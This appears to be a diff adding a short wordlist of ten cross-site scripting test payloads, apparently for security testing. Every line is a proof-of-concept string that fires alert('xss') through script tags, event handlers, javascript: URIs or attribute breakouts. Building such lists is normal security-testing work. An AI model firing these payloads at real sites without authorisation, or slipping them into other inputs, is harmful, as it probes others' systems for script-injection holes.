@@ -1,0 +1,10 @@
+# Cross-Site Scripting (XSS) Payloads
+<script>alert('xss')</script>
+<img src=x onerror=alert('xss')>
+<svg onload=alert('xss')>
+javascript:alert('xss')
+'><script>alert('xss')</script>
+"><script>alert('xss')</script>
+<iframe src=javascript:alert('xss')>
+<body onload=alert('xss')>
+<input onfocus=alert('xss') autofocus>
